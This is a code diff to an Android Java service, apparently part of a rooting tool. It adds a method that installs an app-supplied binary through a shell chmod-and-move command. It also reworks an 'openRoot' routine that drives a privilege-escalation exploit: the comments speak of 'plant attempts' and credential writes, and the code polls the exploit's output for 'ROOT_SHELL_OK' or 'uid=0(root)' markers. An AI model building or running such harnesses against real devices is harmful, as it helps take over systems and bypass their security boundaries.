@@ -79,6 +79,38 @@ public class UserService extends IUserService.Stub {
         }
     }
 
+    /**
+     * Installs a binary downloaded by the app. The fd stays readable even
+     * though the app's cache directory is private to the untrusted_app uid.
+     */
+    @Override
+    public String installFd(android.os.ParcelFileDescriptor fd) {
+        if (fd == null) {
+            return "install failed: no data";
+        }
+        String tmp = BIN + ".new";
+        try {
+            try (InputStream in = new android.os.ParcelFileDescriptor.AutoCloseInputStream(fd);
+                 FileOutputStream out = new FileOutputStream(tmp)) {
+                byte[] buf = new byte[65536];
+                int n;
+                while ((n = in.read(buf)) > 0) {
+                    out.write(buf, 0, n);
+                }
+            }
+            Process move = Runtime.getRuntime().exec(new String[]{"/system/bin/sh",
+                    "-c", "chmod 755 " + tmp + " && mv -f " + tmp + " " + BIN});
+            int rc = move.waitFor();
+            if (rc != 0) {
+                return "install failed: mv rc=" + rc;
+            }
+            return "installed " + new File(BIN).length() + " bytes (uid="
+                    + android.system.Os.getuid() + ")";
+        } catch (Throwable t) {
+            return "install failed: " + t;
+        }
+    }
+
     @Override
     public String run(String args) {
         try {
@@ -88,8 +120,8 @@ public class UserService extends IUserService.Stub {
             pb.redirectErrorStream(true);
             Process p = pb.start();
             String text = readAll(p.getInputStream());
-            if (!p.waitFor(90, TimeUnit.SECONDS)) {
-                return text + "\n[timeout] still running after 90s - do not kill it,"
+            if (!p.waitFor(300, TimeUnit.SECONDS)) {
+                return text + "\n[timeout] still running after 300s - do not kill it,"
                         + " reboot to clean up";
             }
             return text;
@@ -146,20 +178,42 @@ public class UserService extends IUserService.Stub {
             });
             pump.setDaemon(true);
             pump.start();
-            Thread.sleep(6000);
-            String out = new String();
-            long deadline = System.currentTimeMillis() + 20000;
+            /*
+             * The trigger runs three plant attempts and each one has to wait
+             * for its child to exec and be killed, so a success can take
+             * minutes.  Do not declare failure early: keep reading until the
+             * exploit prints its success marker or exits.
+             */
+            StringBuilder out = new StringBuilder();
+            long deadline = System.currentTimeMillis() + 300000;
+            boolean ok = false;
             while (System.currentTimeMillis() < deadline) {
-                String line = rootLines.poll(100, TimeUnit.MILLISECONDS);
+                String line = rootLines.poll(200, TimeUnit.MILLISECONDS);
                 if (line == null) {
+                    if (!rootProcess.isAlive()) {
+                        // Drain whatever is left, then stop.
+                        String rest;
+                        while ((rest = rootLines.poll()) != null) {
+                            out.append(rest).append('\n');
+                        }
+                        break;
+                    }
                     continue;
                 }
-                out += line + "\n";
-                if (line.contains("uid=0(root)")) {
+                out.append(line).append('\n');
+                if (line.contains("ROOT_SHELL_OK")
+                        || (line.contains("uid=0(root)") && line.contains("context="))) {
+                    ok = true;
                     break;
                 }
+                if (line.contains("parking without reap")
+                        || line.contains("no successful plant")
+                        || line.contains("cred writes landed, waking child")) {
+                    // Give the child a moment to print its id line.
+                    continue;
+                }
             }
-            return "root shell started\n" + out.trim();
+            return (ok ? "root shell ready\n" : "root shell failed\n") + out.toString().trim();
         } catch (Throwable t) {
             return "openRoot failed: " + t;
         }
